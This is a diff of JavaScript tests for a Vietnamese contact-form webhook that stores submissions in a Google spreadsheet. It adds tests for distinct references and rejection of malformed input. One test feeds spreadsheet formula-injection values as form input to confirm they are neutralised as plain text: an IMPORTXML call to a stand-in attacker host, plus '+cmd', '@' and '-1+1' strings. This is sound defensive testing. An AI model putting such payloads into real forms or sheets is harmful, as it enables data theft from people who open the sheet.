@@ -3,8 +3,9 @@ import { readFile } from "node:fs/promises";
 import vm from "node:vm";
 import test from "node:test";
 
-async function loadTemplate() {
+async function loadTemplate(uuids = ["abcd1234-0000-0000-0000-000000000000"]) {
   const rows = [];
+  let uuidIndex = 0;
   const sheet = {
     appendRow(row) { rows.push(row); },
     getLastRow() { return rows.length; },
@@ -28,7 +29,7 @@ async function loadTemplate() {
     },
     Utilities: {
       formatDate: () => "20260725-100000",
-      getUuid: () => "abcd1234-0000-0000-0000-000000000000",
+      getUuid: () => uuids[uuidIndex++],
     },
   });
   const source = await readFile(new URL("../docs/google-apps-script-contact-webhook.gs", import.meta.url), "utf8");
@@ -36,27 +37,37 @@ async function loadTemplate() {
   return { context, rows };
 }
 
+function submit(context, payload) {
+  return context.doPost({ postData: { contents: JSON.stringify(payload) } });
+}
+
+const validProductPayload = {
+  email: "customer@example.test",
+  message: "Cần tư vấn.",
+  name: "Nguyễn Văn A",
+  phone: "0900000000",
+  product: "Bột dinh dưỡng",
+  qty: 20,
+  request_type: "Tư vấn số lượng lớn",
+  secret: "shared-secret",
+  service: "",
+  source: "/lien-he/",
+  variant: "Vị vani",
+};
+
 test("stores user-controlled values as safe plain text instead of spreadsheet formulas", async () => {
   const { context, rows } = await loadTemplate();
-  const output = context.doPost({
-    postData: {
-      contents: JSON.stringify({
-        email: "customer@example.test",
-        message: "=IMPORTXML(\"https://attacker.example\", \"//x\")",
-        name: "+cmd",
-        phone: "0900000000",
-        product: "+Bột dinh dưỡng",
-        qty: 20,
-        request_type: "Tư vấn số lượng lớn",
-        secret: "shared-secret",
-        service: "",
-        source: "-1+1",
-        variant: "@Vị vani",
-      }),
-    },
+  const output = submit(context, {
+    ...validProductPayload,
+    message: "=IMPORTXML(\"https://attacker.example\", \"//x\")",
+    name: "+cmd",
+    product: "+Bột dinh dưỡng",
+    source: "-1+1",
+    variant: "@Vị vani",
   });
 
-  assert.deepEqual(JSON.parse(output.value), { ok: true, reference: "YC-20260725-100000-ABCD1234" });
+  const response = JSON.parse(output.value);
+  assert.deepEqual(response, { ok: true, reference: "YC-20260725-100000-ABCD1234" });
   assert.deepEqual(Array.from(rows[0]), [
     "Mã",
     "Thời gian",
@@ -75,6 +86,8 @@ test("stores user-controlled values as safe plain text instead of spreadsheet fo
     "Cập nhật lần cuối",
   ]);
   assert.equal(rows[1].length, 15);
+  assert.equal(response.reference, rows[1][0]);
+  assert.equal(rows[1][1], rows[1][14]);
   assert.deepEqual(Array.from(rows[1].slice(2, 11)), [
     "Tư vấn số lượng lớn",
     "'+Bột dinh dưỡng",
@@ -87,4 +100,33 @@ test("stores user-controlled values as safe plain text instead of spreadsheet fo
     "'-1+1",
   ]);
   assert.deepEqual(Array.from(rows[1].slice(11, 14)), ["Mới", "", ""]);
+});
+
+test("creates a distinct reference and row for every accepted submit", async () => {
+  const { context, rows } = await loadTemplate([
+    "abcd1234-0000-0000-0000-000000000000",
+    "dcba4321-0000-0000-0000-000000000000",
+  ]);
+
+  const first = JSON.parse(submit(context, validProductPayload).value);
+  const second = JSON.parse(submit(context, validProductPayload).value);
+
+  assert.equal(rows.length, 3);
+  assert.equal(first.reference, rows[1][0]);
+  assert.equal(second.reference, rows[2][0]);
+  assert.notEqual(first.reference, second.reference);
+  assert.equal(rows[2][1], rows[2][14]);
+});
+
+test("rejects mixed and malformed contexts without appending rows", async () => {
+  const { context, rows } = await loadTemplate();
+  const invalidPayloads = [
+    { ...validProductPayload, service: "Sấy & thực phẩm sấy" },
+    { ...validProductPayload, qty: "20" },
+  ];
+
+  for (const payload of invalidPayloads) {
+    assert.deepEqual(JSON.parse(submit(context, payload).value), { ok: false, reference: "" });
+  }
+  assert.equal(rows.length, 0);
 });
